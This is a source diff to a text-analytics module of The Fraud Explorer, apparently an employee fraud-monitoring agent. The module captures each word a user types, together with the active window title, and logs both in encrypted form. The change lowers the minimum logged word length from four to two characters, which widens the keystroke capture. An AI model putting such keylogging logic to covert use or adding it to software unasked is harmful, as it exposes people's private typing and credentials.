@@ -7,8 +7,8 @@
  * Licensed under GNU GPL v3
  * http://www.thefraudexplorer.com/License
  *
- * Date: 2016-05-30 15:12:41 -0500 (Wed, 30 May 2016)
- * Revision: v0.9.5
+ * Date: 2016-06-30 15:12:41 -0500 (Wed, 30 Jun 2016)
+ * Revision: v0.9.6-beta
  *
  * Description: Text Analytics
  */
@@ -163,7 +163,7 @@ namespace TFE_core.Analytics
                             int index = KeyboardWord.IndexOf("Space");
                             KeyboardWord = KeyboardWord.Substring(0, index);
 
-                            if (KeyboardWord.Length > 3 && TextHelpers.WordsSanitizer(KeyboardWord))
+                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                             {
                                 log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                 log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
@@ -176,7 +176,7 @@ namespace TFE_core.Analytics
                             int index = KeyboardWord.IndexOf("Return");
                             KeyboardWord = KeyboardWord.Substring(0, index);
 
-                            if (KeyboardWord.Length > 3 && TextHelpers.WordsSanitizer(KeyboardWord))
+                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                             {
                                 log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                 log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
@@ -189,7 +189,7 @@ namespace TFE_core.Analytics
                             int index = KeyboardWord.IndexOf("Tab");
                             KeyboardWord = KeyboardWord.Substring(0, index);
 
-                            if (KeyboardWord.Length > 3 && TextHelpers.WordsSanitizer(KeyboardWord))
+                            if (KeyboardWord.Length > 1 && TextHelpers.WordsSanitizer(KeyboardWord))
                             {
                                 log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                              log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(KeyboardWord).ToLower());
